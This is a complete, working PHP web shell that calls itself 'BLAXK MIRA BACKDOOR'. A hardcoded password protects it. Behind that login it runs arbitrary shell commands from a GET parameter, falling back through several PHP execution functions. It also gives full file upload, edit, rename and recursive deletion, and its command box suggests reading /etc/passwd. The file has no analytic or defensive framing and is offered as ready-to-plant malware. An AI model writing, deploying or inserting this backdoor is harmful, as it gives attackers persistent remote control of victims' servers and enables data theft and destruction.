<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$password = 'Nika123h';
$self = basename($_SERVER['SCRIPT_NAME']);

session_start();
if (!isset($_SESSION['auth'])) {
    if (isset($_POST['p']) && $_POST['p'] === $password) {
        $_SESSION['auth'] = true;
    } else {
        echo '<!DOCTYPE html><title>BLAXK MIRA</title><style>body{background:#000;color:#ff0044;font-family:monospace;padding:60px;text-align:center;}input{background:#111;color:#ff0044;border:1px solid #ff0044;padding:12px;font-size:16px;}</style>';
        echo '<h1>BLAXK MIRA</h1><h3>ENTER THE VOID</h3><form method="post"><input type="password" name="p" autofocus placeholder="password"><br><br><input type="submit" value="UNLOCK"></form>';
        exit;
    }
}

function h($s) { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }

function human_size($b) {
    $u = ['B','KB','MB','GB','TB'];
    for($i=0; $b>=1024 && $i<4; $b/=1024, $i++);
    return round($b,1).' '.$u[$i];
}

function force_delete($path) {
    if (is_file($path)) return @unlink($path);
    if (!is_dir($path)) return false;
    
    $it = new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS);
    $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
    foreach ($files as $file) {
        if ($file->isDir()) @rmdir($file->getRealPath());
        else @unlink($file->getRealPath());
    }
    return @rmdir($path);
}

function safe_path($p) {
    $p = realpath($p) ?: $p;
    $base = realpath(getcwd());
    if (strpos($p, $base) !== 0) die("path traversal blocked");
    return $p;
}

chdir(getcwd());
$current = realpath(getcwd());
$msg = '';

if (isset($_GET['cd']) && $_GET['cd'] !== '') {
    $target = safe_path($_GET['cd']);
    if (is_dir($target)) {
        chdir($target);
        $current = realpath($target);
    } else {
        $msg = "not a directory";
    }
}

if (isset($_POST['newdir']) && trim($_POST['newdir'])) {
    $name = trim($_POST['newdir']);
    $path = $current . '/' . $name;
    if (!file_exists($path)) {
        @mkdir($path, 0755) ? $msg = "dir created" : $msg = "mkdir failed";
    } else $msg = "already exists";
}

if (isset($_POST['newfile']) && trim($_POST['newfile'])) {
    $name = trim($_POST['newfile']);
    $path = $current . '/' . $name;
    if (!file_exists($path)) {
        @file_put_contents($path, '') !== false ? $msg = "file created" : $msg = "create failed";
    } else $msg = "already exists";
}

if (isset($_GET['del'])) {
    $target = safe_path($_GET['del']);
    if (force_delete($target)) {
        $msg = "deleted (recursive if folder)";
    } else {
        $msg = "delete failed";
    }
    header("Location: $self?cd=" . urlencode($current));
    exit;
}

if (isset($_GET['rename']) && isset($_POST['newname'])) {
    $old = safe_path($_GET['rename']);
    $newname = trim($_POST['newname']);
    if ($newname) {
        $newpath = dirname($old) . '/' . $newname;
        @rename($old, $newpath) ? $msg = "renamed" : $msg = "rename failed";
    }
}

if (isset($_POST['save']) && isset($_POST['path']) && isset($_POST['content'])) {
    $path = safe_path($_POST['path']);
    @file_put_contents($path, $_POST['content']) !== false ? $msg = "saved" : $msg = "save failed";
}

if (isset($_FILES['upfile']) && $_FILES['upfile']['error'] === 0) {
    $target = $current . '/' . basename($_FILES['upfile']['name']);
    move_uploaded_file($_FILES['upfile']['tmp_name'], $target)
        ? $msg = "uploaded"
        : $msg = "upload failed";
}
?>

<!DOCTYPE html>
<html>
<head>
<title>BLAXK MIRA BACKDOOR</title>
<meta charset="utf-8">
<style>
body{font-family:monospace;background:#000;color:#ff0044;margin:0;padding:15px;font-size:14px;}
a{color:#ff0044;text-decoration:none;}
a:hover{color:#ff4488;}
pre{background:#111;padding:12px;border:1px solid #222;white-space:pre-wrap;max-height:500px;overflow:auto;color:#ff88aa;}
input,textarea{background:#111;color:#ff0044;border:1px solid #444;padding:6px;font-family:monospace;}
table{width:100%;border-collapse:collapse;margin:10px 0;}
th,td{border:1px solid #333;padding:6px;text-align:left;}
th{background:#1a0000;}
.dir{color:#ff66aa;}
.file{color:#ffdddd;}
.size{color:#aa4444;}
.msg{color:#ffff00;background:#220;padding:8px;margin:10px 0;border:1px solid #440;}
header{background:#000;padding:12px;margin:-15px -15px 20px -15px;border-bottom:2px solid #ff0044;}
.btn{padding:6px 12px;background:#220;border:1px solid #440;color:#ff0044;cursor:pointer;}
.btn:hover{background:#440;}
form.inline{display:inline;}
</style>
</head>
<body>

<header>
    <b>BLAXK MIRA BACKDOOR</b> • <?=php_uname()?> • <?=date('Y-m-d H:i')?> • <?=h($current)?>
    <span style="float:right;"><a href="?logout" style="color:#ff4488;">[KILL]</a></span>
</header>

<?php if(isset($_GET['logout'])){session_destroy();header("Location: $self");exit;} ?>

<?php if($msg): ?><div class="msg"><?=h($msg)?></div><?php endif; ?>

<!-- CMD FIX -->
<div style="margin:20px 0;">
    <form method="get">
        <input type="text" name="cmd" placeholder="id | whoami | uname -a | cat /etc/passwd | ls -la" style="width:65%;background:#111;color:#ff88aa;border:1px solid #440;">
        <input type="submit" value="RUN" class="btn">
    </form>

    <?php if(isset($_GET['cmd']) && trim($_GET['cmd']) !== ''): 
        $cmd = $_GET['cmd'];
        $output = '';

        if (function_exists('shell_exec')) {
            $output = @shell_exec($cmd . ' 2>&1');
        } 
        if (empty($output) && function_exists('system')) {
            ob_start();
            @system($cmd . ' 2>&1');
            $output = ob_get_clean();
        } 
        if (empty($output) && function_exists('exec')) {
            $lines = [];
            @exec($cmd . ' 2>&1', $lines);
            $output = implode("\n", $lines);
        } 
        if (empty($output) && function_exists('passthru')) {
            ob_start();
            @passthru($cmd . ' 2>&1');
            $output = ob_get_clean();
        } 
        if (empty($output) && function_exists('popen')) {
            $handle = @popen($cmd . ' 2>&1', 'r');
            if (is_resource($handle)) {
                while (!feof($handle)) {
                    $output .= fread($handle, 8192);
                }
                pclose($handle);
            }
        }

        if (empty($output)) {
            $output = "command gave no output / blocked by host / disabled functions";
        }

        echo '<pre>' . h($output) . '</pre>';
    endif; ?>
</div>

<div style="margin:15px 0;">
    <form method="post" enctype="multipart/form-data" class="inline">
        <input type="file" name="upfile" style="color:#ff0044;">
        <input type="submit" value="UPLOAD" class="btn">
    </form>

    <form method="post" class="inline" style="margin-left:40px;">
        New dir: <input type="text" name="newdir" size="20">
        <input type="submit" value="MKDIR" class="btn">
    </form>

    <form method="post" class="inline" style="margin-left:40px;">
        New file: <input type="text" name="newfile" size="20">
        <input type="submit" value="TOUCH" class="btn">
    </form>
</div>

<h3>DIR: <?=h($current)?></h3>

<table>
<tr><th>Name</th><th>Type</th><th>Size</th><th>Perms</th><th>Actions</th></tr>

<?php
$parent = dirname($current);
if ($parent !== $current && $parent !== '/') {
    echo "<tr><td><a href='?cd=".urlencode($parent)."' class='dir'>[..] PARENT</a></td><td>Directory</td><td>-</td><td>-</td><td></td></tr>";
}

foreach (scandir($current) as $o) {
    if ($o === '.' || $o === '..') continue;
    $full = $current . '/' . $o;
    $isdir = is_dir($full);
    $size  = $isdir ? '-' : human_size(@filesize($full) ?: 0);
    $perms = substr(sprintf('%o', fileperms($full)), -4);
    $cls   = $isdir ? 'dir' : 'file';

    echo "<tr>";
    if ($isdir) {
        echo "<td><a href='?cd=".urlencode($full)."' class='$cls'>[DIR] ".h($o)."</a></td>";
    } else {
        echo "<td><a href='?edit=".urlencode($full)."' class='$cls'>".h($o)."</a></td>";
    }
    echo "<td>".($isdir?'Directory':'File')."</td>";
    echo "<td class='size'>$size</td>";
    echo "<td>$perms</td>";
    echo "<td>";
    if (!$isdir) echo "<a href='?edit=".urlencode($full)."'>edit</a> ";
    echo "<a href='?del=".urlencode($full)."' onclick='return confirm(\"Delete ".h($o)." ? (recursive if folder)\")'>del</a> ";
    echo "<form method='post' class='inline'><input type='hidden' name='rename' value='".urlencode($full)."'><input type='text' name='newname' size='12' placeholder='new name' style='width:90px;'><input type='submit' value='rename' class='btn' style='padding:3px 6px;font-size:11px;'></form>";
    echo "</td></tr>";
}
?>
</table>

<?php
if (isset($_GET['edit'])) {
    $file = safe_path($_GET['edit']);
    if (is_file($file)) {
        $content = @file_get_contents($file);
?>
<h3>EDIT: <?=h(basename($file))?></h3>
<form method="post">
    <textarea name="content" style="width:100%;height:580px;background:#0a0000;color:#ff88aa;border:1px solid #440;"><?=h($content)?></textarea><br><br>
    <input type="hidden" name="path" value="<?=h($file)?>">
    <input type="submit" name="save" value="SAVE" class="btn">
    <a href="?cd=<?=urlencode($current)?>" class="btn">BACK</a>
</form>
<?php
    }
}
?>

</body>
</html>
